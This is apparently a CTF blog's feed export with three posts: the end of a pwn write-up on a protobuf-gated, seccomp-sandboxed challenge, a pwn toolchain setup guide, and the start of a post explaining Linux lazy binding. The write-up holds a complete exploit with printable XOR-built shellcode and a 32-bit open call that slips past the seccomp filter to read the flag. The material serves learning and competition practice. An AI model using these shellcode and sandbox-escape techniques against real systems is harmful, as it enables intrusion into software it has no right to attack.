keyword">import</span> Msgbot<span class="token keyword">import</span> grpcmsg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token number">0xC0DEFEED</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> <span class="token number">0xF00DFACE</span>msg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> shellcodeserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>check</code>函数对<code>shellcode</code>进行了检查，限制<code>shellcode</code>在可见字符范围内</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> i <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token char">'\x1F'</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\x7F'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Oops!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h2><p><strong>调试<code>shellcode</code>的时候用<code>si</code>不要用<code>ni</code>！！</strong></p><h3 id="检查沙箱"><a href="#检查沙箱" class="headerlink" title="检查沙箱"></a>检查沙箱</h3><p>通过<code>check</code>之后开启沙箱，所以要执行到发送正确的消息之后才能用<code>seccomp-tools</code>查看沙箱情况，这里可以将<code>process</code>的参数设置为<code>seccomp-tools</code>即<code>r = process([&quot;seccomp-tools&quot;, &quot;dump&quot;, &quot;./pwn&quot;])</code>，发送完<code>msg</code>就会显示沙箱的情况</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token number">0000</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  A <span class="token operator">=</span> sys_number <span class="token number">0001</span><span class="token operator">:</span> <span class="token number">0x35</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x40000000</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0003</span> <span class="token number">0002</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x06</span> <span class="token number">0xffffffff</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0003</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x05</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> read<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0004</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x04</span> <span class="token number">0x00</span> <span class="token number">0x00000001</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> write<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0005</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x03</span> <span class="token number">0x00</span> <span class="token number">0x00000005</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> fstat<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0006</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x02</span> <span class="token number">0x00</span> <span class="token number">0x00000025</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> alarm<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0007</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x01</span> <span class="token number">0x00</span> <span class="token number">0x000000e7</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> exit_group<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0008</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword">return</span> KILL <span class="token number">0009</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x7fff0000</span>  <span class="token keyword">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里限制了只能使用<code>read write fstat alarm exit_group</code>，程序是<code>64</code>位的，而<code>fstat</code>在<code>32</code>位中对应的函数就是<code>open</code>，所以可以使用<code>32</code>位的<code>open</code>和<code>64</code>位的<code>read write</code></p><h3 id="构造syscall"><a href="#构造syscall" class="headerlink" title="构造syscall"></a>构造syscall</h3><p>限制了可见字符且限制长度的情况下第一步就需要先构造一个<code>read</code>无限制的再读一次，而<code>syscall</code>的汇编字节是<code>0x0f05</code>不在可见字符范围内，所以需要通过异或构造，需要注意端序问题，小端序要反过来写进去，即<code>0x050f</code>，写在<code>shellcode</code>末尾用来异或的数值也要反过来写，我选择的是<code>0x66666963 ^ 0x66666c6c = 0x50f</code>，构造<code>shellcode</code>如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push 0x66666963pop rsixor qword ptr [rax + 0x20], rsipush rbxpop rdixor al, 0x22push raxpop rsipush 0x66666963pop rdxpush rbxpop raxpush raxpush raxpush raxpush raxpush raxpush rax\x6c\x6c\x66\x66<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="架构切换调用open"><a href="#架构切换调用open" class="headerlink" title="架构切换调用open"></a>架构切换调用open</h3><p>使用汇编指令<code>retfq</code>切换架构，原理是改<code>cs</code>寄存器，当<code>cs</code>寄存器的值为<code>0x33</code>时识别为<code>64</code>位，当寄存器值位<code>0x23</code>时识别位<code>32</code>位，而<code>retfq</code>指令相当于<code>pop ip; pop cs</code>，所以需要先<code>push cs</code>再<code>push</code>需要执行的指令地址最后<code>retfq</code>切换架构</p><p>不过其实我没切换直接写<code>32</code>位的<code>shellcode</code>用<code>int 80</code>实现系统调用也能执行<code>open</code>…<code>shellcode</code>如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov  eax, 5push ecxpop  ebxmov  dword ptr [ecx], 0x6c662f2eadd  ecx, 4mov  dword ptr [ecx], 0x6761xor ecx, ecxxor edx, edxint  0x80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpccontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">21231</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''push 0x66666963pop rsixor qword ptr [rax + 0x20], rsipush rbxpop rdixor al, 0x22push raxpop rsipush 0x66666963pop rdxpush rbxpop raxpush raxpush raxpush raxpush raxpush raxpush rax\x6c\x6c\x66\x66'''</span>msgcontent <span class="token operator">=</span> <span class="token string">b'\x68\x63\x69\x66\x66\x5e\x48\x31\x70\x20\x53\x5f\x34\x22\x50\x5e\x68\x63\x69\x66\x66\x5a\x53\x58'</span> <span class="token operator">+</span> <span class="token string">b'\x50'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x6c\x6c\x66\x66'</span>msg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token number">0xC0DEFEED</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> <span class="token number">0xF00DFACE</span>msg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> msgcontentserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov  eax, 5push ecxpop  ebxmov  dword ptr [ecx], 0x6c662f2eadd  ecx, 4mov  dword ptr [ecx], 0x6761xor ecx, ecxxor edx, edxint  0x80'''</span>shellcode <span class="token operator">=</span> <span class="token string">b"\xb8\x05\x00\x00\x00\x51\x5b\xc7\x01\x2e\x2f\x66\x6c\x83\xc1\x04\xc7\x01\x61\x67\x00\x00\x31\xc9\x31\xd2\xcd\x80"</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本题来源于源鲁杯第一轮&lt;code&gt;pwn&lt;/code&gt;的困难题，向程序发送了&lt;code&gt;msg&lt;/code&gt;之后会判定是否符合&lt;code&gt;proto&lt;/code&gt;结构，符合则开启沙箱仅允许执行&lt;code&gt;read、write、fstat、alarm、exit_group&lt;/</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="protobuf" scheme="https://starrysky1004.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>pwn环境配置</title>
    <link href="https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/"/>
    <id>https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/</id>
    <published>2024-10-05T09:04:55.000Z</published>
    <updated>2024-12-10T07:15:56.284Z</updated>
    
    <content type="html"><![CDATA[<p>视频版：<a href="https://www.bilibili.com/video/BV1YT1oYeEVd">https://www.bilibili.com/video/BV1YT1oYeEVd</a></p><h2 id="更新、安装vim"><a href="#更新、安装vim" class="headerlink" title="更新、安装vim"></a>更新、安装vim</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="安装必要环境"><a href="#安装必要环境" class="headerlink" title="安装必要环境"></a>安装必要环境</h2><p>将一下内容写入一个<code>sh</code>脚本文件中，为<code>chmod 777 xxx.sh</code>文件赋权限后直接<code>./xxx.sh</code>运行脚本，中途会出现<code>Do you want to continue? [Y/n]</code>输入<code>y</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> ~<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> tzdata<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxml2-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxslt-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libmysqlclient-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libsqlite3-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> zlib1g-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python2-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-pip<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libssl-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">wget</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">curl</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> clang<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">zip</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libncursesw5-dev libgdbm-dev libc6-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> tk-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssl<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> virtualenv<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> proxychains4<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby-dev<span class="token comment">#setuptools 36.6.1 -> python2</span><span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/56/a0/4dfcc515b1b993286a64b9ab62562f09e6ed2d09288909aee1efdb9dde16/setuptools-36.6.1.zip<span class="token function">unzip</span> setuptools-36.6.1.zip<span class="token builtin class-name">cd</span> setuptools-36.6.1<span class="token function">sudo</span> python2 setup.py <span class="token function">install</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> setuptools-36.6.1 setuptools-36.6.1.zip<span class="token comment">#setuptools 65.4.1 -> python3</span><span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/03/c9/7b050ea4cc4144d0328f15e0b43c839e759c6c639370a3b932ecf4c6358f/setuptools-65.4.1.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> setuptools-65.4.1.tar.gz<span class="token builtin class-name">cd</span> setuptools-65.4.1<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> setuptools-65.4.1 setuptools-65.4.1.tar.gz<span class="token comment">#pip</span><span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/53/7f/55721ad0501a9076dbc354cc8c63ffc2d6f1ef360f49ad0fbcce19d68538/pip-20.3.4.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pip-20.3.4.tar.gz<span class="token builtin class-name">cd</span> pip-20.3.4<span class="token function">sudo</span> python2 setup.py <span class="token function">install</span><span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> pip-20.3.4 pip-20.3.4.tar.gz<span class="token function">sudo</span> pip2 config <span class="token builtin class-name">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple<span class="token function">sudo</span> pip3 config <span class="token builtin class-name">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple<span class="token function">sudo</span> python2 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pippip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> pip2 <span class="token function">install</span> pathlib2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置pwn环境"><a href="#配置pwn环境" class="headerlink" title="配置pwn环境"></a>配置pwn环境</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python2 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="pwndbg-Pwngdb"><a href="#pwndbg-Pwngdb" class="headerlink" title="pwndbg+Pwngdb"></a>pwndbg+Pwngdb</h3><p>这里我直接去<code>github</code>下载运行<code>setup.sh</code>会报错要求升级<code>python3</code>，所以直接把原来虚拟机里的打包复制过来了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://starrysky1004.github.io/pwnenv.zip<span class="token function">unzip</span> pwnenv.zip<span class="token function">rm</span> pwnenv.zip<span class="token comment">#pwndbg</span><span class="token builtin class-name">cd</span> pwndbg./setup.sh<span class="token comment">#Pwngdb</span><span class="token builtin class-name">cd</span> ~/<span class="token function">cp</span> ~/Pwngdb/.gdbinit ~/<span class="token function">vim</span> ~/.gdbinit<span class="token comment">#注释掉第一行 然后在第二行写入</span><span class="token builtin class-name">source</span> ~/pwndbg/gdbinit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> patchelf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#glibc-all-in-one</span><span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git<span class="token builtin class-name">cd</span> glibc-all-in-onepython3 update_list<span class="token function">cat</span> list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip3 <span class="token function">install</span> capstone filebytes unicorn keystone-engine ropper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Ropgadget"><a href="#Ropgadget" class="headerlink" title="Ropgadget"></a>Ropgadget</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-H</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> ROPgadget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="one-gadget、seccomp-tools"><a href="#one-gadget、seccomp-tools" class="headerlink" title="one_gadget、seccomp-tools"></a>one_gadget、seccomp-tools</h3><p>这两个我感觉很随缘，没事运行一下看运气吧（</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span class="token function">sudo</span> gem <span class="token function">install</span> seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>推荐装个<code>oh-my-zsh</code>，主题多、好看，而且可以<code>Tab</code>选择文件以及回滚以前输入的命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;视频版：&lt;a href=&quot;https://www.bilibili.com/video/BV1YT1oYeEVd&quot;&gt;https://www.bilibili.com/video/BV1YT1oYeEVd&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;更新、安装vim&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux延迟绑定机制过程</title>
    <link href="https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/"/>
    <id>https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/</id>
    <published>2024-09-26T09:51:38.000Z</published>
    <updated>2024-09-26T13:46:46.158Z</updated>
    
    <content type="html"><![CDATA[<p>学<code>pwn</code>的时候了解到<code>linux</code>存在延迟绑定机制，延迟绑定之后<code>plt-&gt;got-&gt;函数真实地址</code>，这两天比赛遇到问题了才去关注了一下延迟绑定的具体过程</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>延迟绑定是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数不被调用就不进行绑定。延迟绑定机制可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。</p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>以调用<code>system</code>函数为例，汇编中<code>call system</code>时会调用<code>system_plt</code>，而<code>system_plt</code>中是三条汇编指令（不是<code>system_got</code>地址），其中第一条是<code>jmp system_got</code>，<code>system_plt</code>内容如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.plt:0000000000401050 ; int system(const char *command).plt:0000000000401050 _system         proc near               .plt:0000000000401050                 jmp     cs:off_403660;system_got.plt:0000000000401050 _system         endp.plt:0000000000401050.plt:0000000000401056 ; ---------------------------------------------------------------------------.plt:0000000000401056                 push    2.plt:000000000040105B                 jmp     sub_401020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一次调用<code>system</code>时，<code>system_got</code>中并没有<code>system</code>的真实地址，而是<code>system_plt</code>中第二条指令的地址，即<code>push 2</code>之后跳转到<code>sub_401020</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/20gx 0x4036600x403660 <span class="token operator">&lt;</span>system@got.plt<span class="token operator">></span>:0x00000000004010560x00007ffff7e21c90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中函数<code>sub_401020</code>内容如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.plt:0000000000401020 sub_401020      proc near               ; CODE XREF: .plt:000000000040103B↓j.plt:0000000000401020                                         ; .plt:000000000040104B↓j ....plt:0000000000401020 ; __unwind &#123;.plt:0000000000401020                 push    cs:qword_403640.plt:0000000000401026                 jmp     cs:qword_403648.plt:0000000000401026 sub_401020      endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>qword_403640</code>和<code>qword_403648</code>存在于<code>got</code>表中，<code>got</code>表内容如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.got.plt:0000000000403638 _got_plt        segment qword public &#39;DATA&#39; use64.got.plt:0000000000403638                 assume cs:_got_plt.got.plt:0000000000403638                 ;org 403638h.got.plt:0000000000403638                 dq offset stru_403458.got.plt:0000000000403640 qword_403640    dq 0                    ;linkmap_ptr.got.plt:0000000000403648 qword_403648    dq 0                    